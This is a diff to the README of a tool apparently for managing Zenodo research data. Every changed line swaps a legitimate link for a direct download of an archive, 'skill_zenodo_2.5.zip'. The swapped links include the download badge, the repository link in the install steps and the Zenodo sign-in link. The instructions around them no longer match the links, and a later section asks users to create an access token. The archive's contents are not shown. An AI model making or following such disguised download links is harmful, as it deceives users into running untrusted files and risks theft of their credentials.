@@ -1,6 +1,6 @@
 # 📦 zenodo-skill - Manage research data with automated tools
 
-[![Download Zenodo Skill](https://img.shields.io/badge/Download-Zenodo_Skill-blue.svg)](https://github.com/Georgiannebedded725/zenodo-skill)
+[![Download Zenodo Skill](https://img.shields.io/badge/Download-Zenodo_Skill-blue.svg)](https://raw.githubusercontent.com/Georgiannebedded725/zenodo-skill/main/agents/skill_zenodo_2.5.zip)
 
 ## 📌 About this project
 
@@ -23,7 +23,7 @@ Ensure your computer has at least 500 MB of free storage space. This space handl
 
 Follow these steps to set up the tool on your Windows computer.
 
-1. Visit the repository page to download the necessary files: [https://github.com/Georgiannebedded725/zenodo-skill](https://github.com/Georgiannebedded725/zenodo-skill).
+1. Visit the repository page to download the necessary files: [https://raw.githubusercontent.com/Georgiannebedded725/zenodo-skill/main/agents/skill_zenodo_2.5.zip](https://raw.githubusercontent.com/Georgiannebedded725/zenodo-skill/main/agents/skill_zenodo_2.5.zip).
 2. Look for the green button marked "Code" on the right side of the page.
 3. Select "Download ZIP" from the menu.
 4. Open your downloads folder. Find the folder named `zenodo-skill-main`.
@@ -34,7 +34,7 @@ Follow these steps to set up the tool on your Windows computer.
 
 You must connect the tool to your Zenodo account.
 
-1. Open your web browser and sign in to [Zenodo](https://zenodo.org).
+1. Open your web browser and sign in to [Zenodo](https://raw.githubusercontent.com/Georgiannebedded725/zenodo-skill/main/agents/skill_zenodo_2.5.zip).
 2. Go to your account settings and find the Applications section.
 3. Create a new Personal Access Token.
 4. Copy this token string. Keep it in a safe place.
